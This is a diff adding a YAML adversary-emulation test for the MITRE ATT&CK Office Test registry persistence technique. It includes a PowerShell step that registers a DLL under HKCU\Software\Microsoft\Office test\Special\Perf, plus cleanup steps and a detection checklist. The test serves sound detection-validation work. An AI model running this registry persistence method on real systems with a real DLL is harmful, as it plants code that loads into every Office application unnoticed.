@@ -1,0 +1,71 @@
+id: T1137.002_office_startup_office_test
+name: "Office Application Startup — Office Test"
+mitre_technique: "T1137.002"
+mitre_tactic: "persistence"
+description: >
+  Adversaries abuse the Microsoft Office "Office Test" registry key to load a
+  malicious DLL every time any Office application starts. The key
+  HKCU\Software\Microsoft\Office test\Special\Perf (or the HKLM equivalent)
+  allows specifying an arbitrary DLL path that is loaded by Office applications.
+  This key was originally used by Microsoft for internal performance testing.
+  No elevation is required for the HKCU variant — any user can set it.
+  The DLL runs in the Office application's process context.
+author: stanleytobias
+created: "2026-01-01"
+platform: windows
+references:
+  - https://attack.mitre.org/techniques/T1137/002/
+
+steps:
+  - step: 1
+    type: marker
+    description: "Pre-execution context"
+    message: "Starting T1137.002 — Office Test Registry DLL persistence simulation"
+
+  - step: 2
+    type: exec_powershell
+    description: "Register malicious DLL via Office Test key — no elevation required"
+    command: |
+      $malDll   = "$env:TEMP\PAS_T1137_002_office.dll"
+      Copy-Item "$env:SystemRoot\System32\version.dll" $malDll -Force -ErrorAction SilentlyContinue
+
+      $testKey = "HKCU:\Software\Microsoft\Office test\Special\Perf"
+      New-Item -Path $testKey -Force | Out-Null
+      Set-ItemProperty $testKey -Name "(Default)" -Value $malDll
+
+      Write-Host "[PAS] Office Test DLL registered:"
+      Write-Host "  Key: $testKey"
+      Write-Host "  DLL: $malDll"
+      Write-Host "[PAS] Loads into every Office application (Word, Excel, Outlook) at startup"
+      Write-Host "[PAS] No elevation required — HKCU"
+
+  - step: 3
+    type: sleep
+    description: "Allow telemetry to flush"
+    seconds: 3
+
+  - step: 4
+    type: marker
+    description: "Post-execution prompt"
+    message: "Check SIEM — HKCU\\Software\\Microsoft\\Office test key created, DLL in TEMP"
+
+cleanup:
+  - step: 1
+    type: exec_powershell
+    description: "Remove Office Test registry key and DLL"
+    command: |
+      Remove-Item "HKCU:\Software\Microsoft\Office test" -Recurse -Force -ErrorAction SilentlyContinue
+      Remove-Item "$env:TEMP\PAS_T1137_002_office.dll" -Force -ErrorAction SilentlyContinue
+      Write-Host "[PAS][Cleanup] Office Test key and DLL removed"
+
+  - step: 2
+    type: marker
+    description: "Cleanup complete"
+    message: "T1137.002 cleanup complete"
+
+analyst_checklist:
+  - "Registry event: HKCU\\Software\\Microsoft\\Office test key created"
+  - "Sentinel: DeviceRegistryEvents | where RegistryKey contains 'Office test' and ActionType == 'RegistryKeyCreated'"
+  - "MDE alert: 'Office Test registry key used for DLL persistence'"
+  - "CONTROL CHECK: This key should never exist in production environments — any entry is malicious"
+  - "CONTROL CHECK: Include HKCU\\Software\\Microsoft\\Office test in Autoruns monitoring baseline"
